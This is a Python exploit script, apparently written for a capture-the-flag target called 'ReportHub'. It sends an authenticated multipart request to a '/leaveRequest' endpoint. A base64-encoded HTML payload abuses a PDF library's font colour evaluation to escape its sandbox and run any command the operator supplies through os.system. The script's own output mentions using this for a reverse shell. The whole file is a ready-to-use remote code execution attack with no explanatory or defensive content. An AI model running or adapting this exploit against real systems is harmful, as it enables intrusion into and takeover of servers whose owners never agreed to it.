#!/usr/bin/python3
import argparse
import requests
from sys import exit
from base64 import b64decode
import urllib.parse

def get_args():
	parser = argparse.ArgumentParser()
	parser.add_argument("--host", required=True, type=str)
	parser.add_argument("--port", "-p", required=True, type=int)
	parser.add_argument("--cmd", "-c", required=True, type=str)
	parser.add_argument("--session", "--cookie", "-sc", required=True, help="Session cookie", type=str)
	args = parser.parse_args()
	return args



def build_post_body(cmd: str) -> bytes:
	print("[*] Building Exploit...")


	# Base64 Encoded Post Template
	base = b64decode("LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNDU3ODUzNjcwMTMzNTUyOTgzMDExNzk0MzIxNzYKQ29udGVudC1EaXNwb3NpdGlvbjogZm9ybS1kYXRhOyBuYW1lPSJ0aW1lX2ludGVydmFsIgoKMjAyOS0wNS0yNiB0byAyMDI5LTA1LTI3Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTQ1Nzg1MzY3MDEzMzU1Mjk4MzAxMTc5NDMyMTc2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ibGVhdmVfcmVxdWVzdCIKCntjbWR9Ci0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTQ1Nzg1MzY3MDEzMzU1Mjk4MzAxMTc5NDMyMTc2CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic2lnbmF0dXJlIjsgZmlsZW5hbWU9IlVudGl0bGVkLnBuZyIKQ29udGVudC1UeXBlOiBpbWFnZS9wbmcKColQTkcKGgoAAAAKSUhEUgAAAAoAAAAKCAIAAAACUFjqAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsMAAA7DAcdvqGQAAAApSURBVChTY9i+fbuAgAADAwMHB8f8+fMlJCSAbARA5gNVQFkjGzAwAADL7QTzijujCwAAAABJRU5ErkJgggotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE0NTc4NTM2NzAxMzM1NTI5ODMwMTE3OTQzMjE3NgpDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InVzZXJfaW5wdXQiCgo8cD5hc2RmPC9wPgotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE0NTc4NTM2NzAxMzM1NTI5ODMwMTE3OTQzMjE3Ni0t")
	exploit_base = b64decode("PHA+PGZvbnQgY29sb3I9IlsgWyBnZXRhdHRyKHBvdywgV29yZCgnX19nbG9iYWxzX18nKSlbJ29zJ10uc3lzdGVtKCd7Y21kfScpIGZvciBXb3JkIGluIFsgb3JnVHlwZUZ1biggJ1dvcmQnLCAoc3RyLCksIHsgJ211dGF0ZWQnOiAxLCAnc3RhcnRzd2l0aCc6IGxhbWJkYSBzZWxmLCB4OiBGYWxzZSwgJ19fZXFfXyc6IGxhbWJkYSBzZWxmLCB4OiBzZWxmLm11dGF0ZSgpIGFuZCBzZWxmLm11dGF0ZWQgPCAwIGFuZCBzdHIoc2VsZikgPT0geCwgJ211dGF0ZSc6IGxhbWJkYSBzZWxmOiB7c2V0YXR0cihzZWxmLCAnbXV0YXRlZCcsIHNlbGYubXV0YXRlZCAtIDEpfSwgJ19faGFzaF9fJzogbGFtYmRhIHNlbGY6IGhhc2goc3RyKHNlbGYpKSwgfSwgKSBdIF0gZm9yIG9yZ1R5cGVGdW4gaW4gW3R5cGUodHlwZSgxKSldXSBhbmQgJ3JlZCciPgoxPC9mb250PjwvcD4=")

	exploit_base = exploit_base.replace(b"{cmd}", bytes(cmd.encode()))

	final = base.replace(b"{cmd}", exploit_base)
	print("[*] Exploit built")
	return final


def send_request(post_body: bytes, session_cookie: str, host: str, port: int):
	print("[*] Preparing request")
	cookie = {"session": session_cookie}
	headers = {}
	headers["User-Agent"] = "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
	headers["Accept-Encoding"] = "gzip, deflate, br"
	headers["Content-Type"] = "multipart/form-data; boundary=---------------------------145785367013355298301179432176"
	headers["Content-Length"] = str(len(post_body))
	headers["Connection"] = "close"
	

	url = f"http://{host}:{port}/leaveRequest"
	print(f"[*] Sending request to {url}")
	print("[*] Sending a reverse shell should cause request to hang")
	r = requests.post(url=url, headers=headers, data=post_body, cookies=cookie)
	print("[*] Request sent")
	status_code = r.status_code
	if r.text.find("Login to ReportHub") > 0: 
		print(f"[!] Bad Request.  Status Code {r.history}.  Check that your session cookie is still valid.")	
		exit(0)
	
	print(f"[*] Probable success. Status Code {status_code}")


def main():
	args = get_args()
	body = build_post_body(args.cmd)
	send_request(body, args.session, args.host, args.port)
	
if __name__ == "__main__":
	main()
